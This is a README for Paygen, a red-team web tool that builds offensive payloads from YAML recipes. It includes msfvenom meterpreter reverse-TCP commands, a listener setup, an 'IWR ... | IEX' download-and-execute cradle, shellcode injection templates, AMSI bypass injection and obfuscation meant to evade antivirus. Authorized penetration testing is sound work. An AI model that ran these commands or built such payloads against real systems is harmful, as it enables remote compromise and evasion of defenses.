# Paygen

> Web-based framework for offensive payload generation with built-in recipe versioning, obfuscation, and shellcode management

![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

Paygen provides a web GUI for creating, editing, and generating offensive payloads from YAML recipes. It features a preprocessing pipeline (encryption, encoding, shellcode generation), multi-level obfuscation (PowerShell, C# names, binary via [LoGiC.NET](https://github.com/SygniaLabs/LoGiC.NET)), AMSI bypass injection, download cradle generation, and a delta-based recipe versioning system.

---

## Screenshots

### Web Interface
![Paygen Web Interface](screenshots/web.png)

---

## Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Recipe System](#recipe-system)
  - [Recipe Format](#recipe-format)
  - [Versioning](#versioning)
  - [Creating and Editing via GUI](#creating-and-editing-via-gui)
- [Preprocessing Pipeline](#preprocessing-pipeline)
  - [Types](#preprocessing-types)
  - [Built-in Preprocessors](#built-in-preprocessors)
- [Shellcode Configuration](#shellcode-configuration)
- [Template System](#template-system)
- [Obfuscation](#obfuscation)
  - [PowerShell Obfuscation](#powershell-obfuscation)
  - [C# Name Obfuscation](#c-name-obfuscation)
  - [Binary Obfuscation (LoGiC.NET)](#binary-obfuscation-logicnet)
  - [AMSI Bypass Integration](#amsi-bypass-integration)
- [PowerShell Features (YAML Config)](#powershell-features-yaml-config)
  - [ps-obfuscation.yaml](#ps-obfuscationyaml)
  - [ps-features.yaml](#ps-featuresyaml)
- [API Reference](#api-reference)
- [Build Pipeline](#build-pipeline)
- [Configuration](#configuration)
- [Testing](#testing)
- [Directory Structure](#directory-structure)
- [Security & Ethics](#security--ethics)
- [Troubleshooting](#troubleshooting)

---

## Installation

```bash
git clone https://github.com/Hailst0rm1/paygen.git
cd paygen
pip install -r requirements.txt
python -m src.main
# Open http://localhost:1337
```

### Requirements

- Python 3.10+
- **PyYAML**, **Jinja2**, **Flask**, **PyCryptodome**, **Rich** (installed via requirements.txt)

### Optional Tools

| Tool | Purpose | Install |
|------|---------|---------|
| `msfvenom` | Shellcode generation | `sudo apt install metasploit-framework` |
| `mcs` | C# compilation (Mono) | `sudo apt install mono-mcs` |
| `gcc` / `mingw-w64` | C/C++ compilation | `sudo apt install gcc-mingw-w64` |
| `psobf` | PowerShell obfuscation | [TaurusOmar/psobf](https://github.com/TaurusOmar/psobf) |
| `donut` | EXE/DLL to shellcode | [TheWover/donut](https://github.com/TheWover/donut) |
| `logic-net` | .NET binary obfuscation | [SygniaLabs/LoGiC.NET](https://github.com/SygniaLabs/LoGiC.NET) |

---

## Quick Start

```bash
# 1. Launch web server
python -m src.main

# 2. Open http://localhost:1337

# 3. Browse/search recipes (press "/" to search)
# 4. Click a recipe to view details
# 5. Click "Generate" to configure parameters and build
# 6. View build output and launch instructions
```

The web interface is a 3-panel SPA with recipe browsing, parameter configuration, build progress tracking, history management, and a standalone PowerShell obfuscator.

---

## Recipe System

### Recipe Format

Recipes are YAML files with 4 sections: `meta`, `parameters`, `preprocessing`, and `output`.

```yaml
meta:
  name: "XOR Process Injector"
  category: "Process Injection"
  description: "XOR-encrypted shellcode injection via VirtualAlloc"
  effectiveness: high  # low | medium | high
  platform: Windows    # optional
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  artifacts:
    - "Allocates executable memory via VirtualAlloc"
    - "Creates remote thread"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP"
    required: true
  - name: "lport"
    type: "port"
    default: 443
    required: true
  - name: "xor_key"
    type: "hex"
    default: "fa"

preprocessing:
  - type: "shellcode"
    name: "Select shellcode method"
    output_var: "raw_shellcode"

  - type: "script"
    name: "XOR encrypt"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  - type: "script"
    name: "Format C#"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
    output_var: "csharp_payload"

output:
  type: "template"
  template: "process_injection/xor_injector.cs"  # or inline multiline
  template_ext: ".cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
  launch_instructions: |
    # Run the payload
    ```shell
    ./{{ output_file }}
    ```
```

**Parameter types**: `ip`, `port`, `string`, `path`, `file`, `hex`, `bool`, `integer`, `choice`, `option`

**Conditional parameters**: Use `required_for` to show/validate a parameter only when a specific preprocessing option is selected:

```yaml
- name: "executable_path"
  type: "file"
  required_for: "Donut shellcode"  # only shown when this option is active
  required: true
```

### Versioning

Recipes use an in-file delta-based versioning system. Version 1 stores the complete `original` recipe. Subsequent versions store only the `changes` (diff) from the previous state. The full recipe is reconstructed by replaying the version chain.

**On-disk format:**

```yaml
versions:
  - version: 1
    comment: "Initial version"
    timestamp: "2025-06-15T10:30:00"
    original:
      meta: { ... }
      parameters: [ ... ]
      preprocessing: [ ... ]
      output: { ... }

  - version: 2
    comment: "Changed encryption to AES"
    timestamp: "2025-06-16T14:00:00"
    changes:
      preprocessing:
        - type: "script"
          script: "aes_encrypt.py"
          ...
```

**Operations:**

- **Create** - Wraps recipe in versioned format with `original` as V1
- **Update** - Computes minimal delta from current state, appends as new version
- **Restore** - Reconstructs state at a target version, appends as new version
- **Remove latest** - Pops the most recent version entry (V1 cannot be removed)
- **View history** - List version metadata (number, comment, timestamp)
- **View specific version** - Reconstruct full recipe at any point in history

Legacy recipes (plain YAML without `versions` wrapper) are loaded transparently as V1.

### Creating and Editing via GUI

The web interface provides a full recipe editor:

- **Create**: Click "New Recipe" to open the YAML editor, write your recipe, and save
- **Edit**: Click "Edit" on any recipe to modify it in the editor. Changes are saved as a new version with a comment
- **Delete**: Remove recipes via the GUI
- **Version history**: View all versions, inspect any historical state, restore previous versions, or remove the latest version

Shellcode configs, PS obfuscation methods, and PS features (AMSI bypasses, cradles) can all be created, edited, and deleted through the GUI in the same way.

---

## Preprocessing Pipeline

### Preprocessing Types

**command** - Run a shell command with Jinja2 template rendering:

```yaml
- type: "command"
  name: "generate_shellcode"
  command: "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={{ lhost }} -f raw"
  output_var: "raw_shellcode"
```

**script** - Run a Python script (reads JSON from stdin, writes JSON to stdout):

```yaml
- type: "script"
  name: "encrypt"
  script: "aes_encrypt.py"
  args:
    data: "{{ shellcode }}"
    key: "auto"
  output_var: "encrypted"
```

**shellcode** - Select from centralized shellcode configs (see [Shellcode Configuration](#shellcode-configuration)):

```yaml
- type: "shellcode"
  name: "Select shellcode method"
  output_var: "raw_shellcode"
```

**option** - Choose between multiple methods at generation time:

```yaml
- type: "option"
  name: "Select method"
  options:
    - type: "command"
      name: "Msfvenom"
      command: "msfvenom ..."
      output_var: "raw_shellcode"
    - type: "command"
      name: "Donut"
      command: "donut ..."
      output_var: "raw_shellcode"
```

### Built-in Preprocessors

Located in `preprocessors/`:

| Script | Purpose | Key I/O |
|--------|---------|---------|
| `xor_encrypt.py` | XOR encryption | `data`, `key` (or "auto") -> `encrypted`, `key_hex` |
| `aes_encrypt.py` | AES-256-CBC | `data`, `key`, `iv` -> `encrypted`, `key_hex`, `iv_hex` |
| `base64_encode.py` | Base64 encoding | `data` -> `encoded` |
| `compress.py` | Gzip compression | `data` -> `compressed`, `size` |
| `format_csharp.py` | C# byte array | `data`, `var_name` -> C# declaration |
| `caesar_cipher.py` | Caesar cipher | `data`, `shift` -> `encrypted` |
| `hex_to_bytes.py` | Hex to raw bytes | `hex_string` -> `bytes` |

**Custom preprocessors**: Create a Python script in `preprocessors/` that reads JSON from stdin and prints JSON to stdout. Reference it in recipes via `type: script`.

---

## Shellcode Configuration

Centralized shellcode definitions in `shellcodes.yaml` are reusable across recipes. The GUI presents them in a dropdown with dynamic parameter forms.

```yaml
- name: "Msfvenom Meterpreter Reverse TCP"
  parameters:
    - name: "lhost"
      type: "ip"
      required: true
    - name: "lport"
      type: "port"
      default: 443
      required: true
  listener: >-
    msfconsole -x "use exploit/multi/handler;
    set payload windows/x64/meterpreter/reverse_tcp;
    set LHOST {{ lhost }}; set LPORT {{ lport }};
    set ExitOnSession false; exploit -j"
  shellcode: >-
    msfvenom -p windows/x64/meterpreter/reverse_tcp
    LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw

- name: "Donut - EXE to Shellcode"
  parameters:
    - name: "executable_path"
      type: "file"
      required: true
  shellcode: "donut -i {{ executable_path }} -a 2 -o /tmp/donut_payload.bin && cat /tmp/donut_payload.bin"

- name: "Custom Shellcode from File"
  parameters:
    - name: "shellcode_file"
      type: "file"
      required: true
  shellcode: "cat {{ shellcode_file }}"
```

**Fields**: `name`, `parameters`, `shellcode` (command template), `listener` (optional - auto-inserted into launch instructions).

**`{{ guid }}`** can be used in shellcode commands for unique temp filenames.

When a recipe uses `type: shellcode` in preprocessing, the GUI automatically loads all configs from `shellcodes.yaml`, shows a dropdown, renders dynamic parameters, validates in real-time, and inserts listener instructions.

Shellcode configs can be created, edited, and deleted through the GUI.

---

## Template System

Templates use Jinja2 syntax. They can be stored as files in `templates/` or inline in the recipe YAML.

**File-based:**
```yaml
output:
  type: template
  template: "process_injection/xor_injector.cs"
```

**Inline:**
```yaml
output:
  type: template
  template_ext: ".cs"
  template: |
    using System;
    class Payload {
        static byte[] buf = { {{ csharp_payload }} };
        static void Main() { /* ... */ }
    }
```

**Available variables**: All recipe parameters, all `output_var` values from preprocessing, and config paths (`{{ config.output_dir }}`, etc.).

**Conditional blocks**: `{{ if args }}content with {{ args }}{{ fi }}` - included only when the variable has a value.

---

## Obfuscation

### PowerShell Obfuscation

Uses the [psobf](https://github.com/TaurusOmar/psobf) tool with 3 levels (High/Medium/Low) and automatic failover. Applied to:

- **Template obfuscation**: Obfuscates the entire `.ps1` payload before output
- **Launch instructions obfuscation**: Obfuscates PowerShell code blocks in launch instructions (works with any recipe type)
- **Standalone obfuscator**: Accessible via the "Obfuscate PS" button in the header for one-off commands

Obfuscation methods are defined in `ps-obfuscation.yaml` and are fully editable via the GUI.

### C# Name Obfuscation

Replaces function and variable names with innocuous identifiers (nature words like `forest`, `lake`, `mountain` and numbered variants like `var1`, `obj1`). Preserves C# keywords, .NET framework types, private members, and P/Invoke declarations. Applied before compilation.

### Binary Obfuscation (LoGiC.NET)

Optional post-compilation obfuscation using [LoGiC.NET](https://github.com/SygniaLabs/LoGiC.NET). Applies renaming, string encryption, control flow obfuscation, integer encoding, junk definitions, invalid metadata, and proxy methods to compiled .NET binaries.

Enabled via the "C# Binary Obfuscation" checkbox in build options. Requires `logic-net` in PATH.

### AMSI Bypass Integration

Modular AMSI bypass injection for PowerShell:

- **Template bypass**: Injects bypass code at the top of `.ps1` templates before obfuscation
- **Launch instructions bypass**: Adds bypass section to launch instructions and prepends to download cradles

Built-in methods: `AmsiInitialize` (amsiInitFailed), `amsiContext` (memory patching). Custom methods can be added to `templates/amsi_bypasses/` as `.ps1` files or created via the GUI through `ps-features.yaml`.

---

## PowerShell Features (YAML Config)

### ps-obfuscation.yaml

Defines `psobf` command templates with randomized variables:

```yaml
- name: High - Maximum obfuscation
  command: >-
    psobf -i {{ temp }} -o {{ out }} -q -level 5
    -pipeline "hex_aes:{{ hex_key }}|string_dict:{{ string_dict }}|dead_code:{{ dead_code }}"
    -seed {{ seed }}
```

**Variables**: `{{ temp }}` (input), `{{ out }}` (output), `{{ hex_key }}`, `{{ string_dict }}` (0-100), `{{ dead_code }}` (0-100), `{{ seed }}` (0-10000).

### ps-features.yaml

Defines AMSI bypasses and download cradles.

```yaml
- name: IWR-IEX (Standard)
  type: cradle-ps1       # amsi | cradle-ps1 | cradle-exe | cradle-dll
  no-obf: false          # hide obfuscation dropdown when true
  code: |
    IWR -Uri "{{ url }}/{{ output_file }}" -UseBasicParsing | IEX
```

Features can use `code` (static template), `command` (execute shell command, stdout becomes output), or both (command for side effects, code for output).

**Cradle variables**: `{{ url }}` (auto-constructed from lhost/lport), `{{ lhost }}`, `{{ lport }}`, `{{ output_file }}`, `{{ output_path }}`, `{{ namespace }}`, `{{ class }}`, `{{ entry_point }}`, `{{ args }}`.

**URL construction**: Port 80 -> `http://host`, port 443 -> `https://host`, other -> `http://host:port`. For non-HTTP protocols (SMB), use `{{ lhost }}` directly.

All PS features and obfuscation methods are fully manageable through the GUI (create, edit, delete).

---

## API Reference

### Recipes

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/recipes` | List all recipes (supports `?search=` and `?category=` query params) |
| `GET` | `/api/recipe/<category>/<name>` | Get recipe details |
| `GET` | `/api/recipe/<category>/<name>/code` | Get rendered code (runs preprocessing + template) |
| `GET` | `/api/recipe/<category>/<name>/raw` | Get raw YAML for editing |
| `POST` | `/api/recipes/create` | Create a new recipe |
| `POST` | `/api/recipes/validate` | Validate recipe structure |
| `PUT` | `/api/recipe/<category>/<name>` | Update recipe (appends new version) |
| `DELETE` | `/api/recipe/<category>/<name>` | Delete recipe |

### Recipe Versioning

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/recipe/<category>/<name>/versions` | List version metadata |
| `GET` | `/api/recipe/<category>/<name>/versions/<ver>` | Get full recipe at specific version |
| `POST` | `/api/recipe/<category>/<name>/versions/<ver>/restore` | Restore a previous version |
| `DELETE` | `/api/recipe/<category>/<name>/versions/latest` | Remove latest version |

### Shellcode

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/shellcodes` | List all shellcode configs |
| `GET` | `/api/shellcode/<name>` | Get shellcode config |
| `GET` | `/api/shellcode/<name>/raw` | Get raw YAML |
| `POST` | `/api/shellcodes/create` | Create shellcode config |
| `PUT` | `/api/shellcode/<name>` | Update shellcode config |
| `DELETE` | `/api/shellcode/<name>` | Delete shellcode config |
| `POST` | `/api/shellcodes/generate` | Generate shellcode (standalone) |
| `POST` | `/api/shellcodes/save` | Save shellcode output to file |

### PowerShell Features

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/ps-features` | List all PS features (AMSI, cradles) |
| `GET` | `/api/ps-feature/<name>/raw` | Get raw YAML |
| `GET` | `/api/ps-feature/<name>/info` | Get feature info |
| `POST` | `/api/ps-features/create` | Create PS feature |
| `PUT` | `/api/ps-feature/<name>` | Update PS feature |
| `DELETE` | `/api/ps-feature/<name>` | Delete PS feature |
| `POST` | `/api/ps-features/generate` | Generate PS feature output |
| `POST` | `/api/ps-features/save` | Save PS feature output to file |
| `GET` | `/api/ps-cradles` | List download cradles |
| `GET` | `/api/amsi-bypasses` | List AMSI bypasses |

### PowerShell Obfuscation Methods

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/ps-obfuscation-methods` | List obfuscation methods |
| `GET` | `/api/ps-obfuscation-method/<name>/raw` | Get raw YAML |
| `POST` | `/api/ps-obfuscation-methods/create` | Create method |
| `PUT` | `/api/ps-obfuscation-method/<name>` | Update method |
| `DELETE` | `/api/ps-obfuscation-method/<name>` | Delete method |

### Payload Generation

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/generate` | Generate payload from recipe + parameters |
| `GET` | `/api/build-status/<session_id>` | Poll build progress |
| `POST` | `/api/validate-parameter` | Validate a single parameter |
| `POST` | `/api/obfuscate-ps` | Standalone PowerShell obfuscation |
| `POST` | `/api/obfuscate-ps-generate-cradle` | Generate cradle for obfuscated code |
| `POST` | `/api/obfuscate-ps-save` | Save obfuscated PowerShell to file |

### History

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/history` | Get build history (100 most recent) |
| `GET` | `/api/history/<index>` | Get specific history entry |
| `POST` | `/api/history/<index>/regenerate` | Regenerate from history |
| `DELETE` | `/api/history/<index>` | Delete history entry |
| `POST` | `/api/history/clear` | Clear all history |

### Utility

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/read-file` | Read a file from disk (path-validated) |

---

## Build Pipeline

```
User Parameters
      |
Preprocessing (command / script / shellcode / option)
      |
Template Rendering (Jinja2)
      |
Comment Removal (optional)
      |
Console Output Removal (optional)
      |
AMSI Bypass Injection (optional, before obfuscation)
      |
PowerShell Obfuscation (optional, psobf)
      |
C# Name Obfuscation (optional)
      |
Compilation (mcs, gcc, etc.)
      |
Binary Obfuscation / LoGiC.NET (optional, post-compilation)
      |
Binary Stripping (optional)
      |
Output File + Launch Instructions + History Record
```

Build options are configurable per-generation via checkboxes in the GUI:
- Remove comments (language-aware: C#, PowerShell, Python, VBA, ASPX)
- Remove console output (Console.WriteLine, print, Write-Host, etc.)
- Strip binaries
- PowerShell obfuscation (High/Medium/Low)
- C# name obfuscation
- C# binary obfuscation (LoGiC.NET)
- AMSI bypass (template and/or launch instructions)
- Launch instructions obfuscation

---

## Configuration

Auto-created at `~/.config/paygen/config.yaml` on first run:

```yaml
# Directories
recipes_dir: "~/Documents/Tools/paygen/recipes"
templates_dir: "~/Documents/Tools/paygen/templates"
preprocessors_dir: "~/Documents/Tools/paygen/preprocessors"
output_dir: "~/Documents/Tools/paygen/output"

# YAML config files
ps_obfuscation_yaml: "~/Documents/Tools/paygen/ps-obfuscation.yaml"
ps_features_yaml: "~/Documents/Tools/paygen/ps-features.yaml"
shellcodes_config: "~/Documents/Tools/paygen/shellcodes.yaml"

# Build options
keep_source_files: false
show_build_debug: false
remove_comments: true
strip_binaries: false

# Web server
web_host: "0.0.0.0"
web_port: 1337
web_debug: false
```

The GUI also has a **Settings** panel (header) for configuring a default LHOST that auto-fills all IP fields across recipes, shellcode configs, and cradles. Stored in browser localStorage.

---

## Testing

```bash
pytest tests/ -v
pytest --cov=src tests/
```

---

## Directory Structure

```
paygen/
├── src/
│   ├── main.py                  # Entry point (starts web server)
│   ├── core/
│   │   ├── config.py            # ConfigManager (~/.config/paygen/config.yaml)
│   │   ├── recipe_loader.py     # Recipe loading with mtime caching
│   │   ├── recipe_manager.py    # Recipe CRUD and versioning
│   │   ├── shellcode_loader.py  # Shellcode config loader
│   │   ├── payload_builder.py   # Build orchestrator
│   │   ├── preprocessor.py      # Preprocessing execution
│   │   ├── compiler.py          # Compilation wrapper
│   │   ├── validator.py         # Parameter and recipe validation
│   │   └── history.py           # Build history tracking
│   ├── web/
│   │   ├── app.py               # Flask app + all API endpoints
│   │   ├── static/              # CSS (Catppuccin Mocha), JS, favicon
│   │   └── templates/           # index.html (SPA)
│   └── utils/
│       └── templates.py         # Template utilities
├── recipes/                     # Recipe YAML files
├── templates/                   # Source code templates (C#, PS1)
│   ├── process_injection/       # Injection templates
│   └── amsi_bypasses/           # AMSI bypass scripts
├── preprocessors/               # Python preprocessing scripts
├── shellcodes.yaml              # Shellcode generation configs
├── ps-obfuscation.yaml          # psobf method definitions
├── ps-features.yaml             # AMSI bypasses and download cradles
├── tests/                       # pytest test suite
├── output/                      # Generated payloads (gitignored)
└── requirements.txt
```

---

## Security & Ethics

This tool generates payloads for **authorized security testing only**.

**Authorized use**: Penetration testing with written authorization, red team operations, security research in controlled environments, educational purposes.

**OPSEC notes**:
- `output/` is gitignored - never commit generated payloads
- `config.yaml` contains local paths (gitignored)
- `history.json` contains build data (gitignored)

---

## Troubleshooting

**Compiler not found:**
```bash
sudo apt install mono-mcs         # C# (Debian/Ubuntu)
sudo pacman -S mono               # C# (Arch)
sudo apt install metasploit-framework  # msfvenom
```

**LoGiC.NET not found:** Ensure `logic-net` is in PATH. See [SygniaLabs/LoGiC.NET](https://github.com/SygniaLabs/LoGiC.NET) for build instructions.

**psobf not found:** See [TaurusOmar/psobf](https://github.com/TaurusOmar/psobf) for installation.

**Template variables not rendering:** Ensure `output_var` in preprocessing matches the `{{ variable }}` name in templates.

---

## Tech Stack

- **Backend**: Flask, Jinja2, PyYAML, PyCryptodome, Rich
- **Frontend**: Vanilla JS, Prism.js (syntax highlighting), Marked.js (markdown rendering)
- **Theme**: Catppuccin Mocha

---

## License

MIT License - See [LICENSE](LICENSE) for details.

---

**Author**: Hailst0rm
**Repository**: https://github.com/Hailst0rm1/paygen
